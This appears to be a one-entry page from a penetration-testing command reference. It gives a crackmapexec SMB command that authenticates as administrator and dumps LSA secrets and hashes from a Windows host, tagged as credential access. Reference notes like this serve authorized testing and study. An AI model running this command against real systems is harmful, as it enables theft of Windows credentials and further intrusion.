# crackmapexec smb <FQDN/IP> -u administrator -p 'Password123!' --lsa

OS: Linux, Windows
Description: crackmapexec dump lsa hashes
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: windows (https://www.notion.so/windows-1454c8e52376809bb701cef01e9f111a?pvs=21)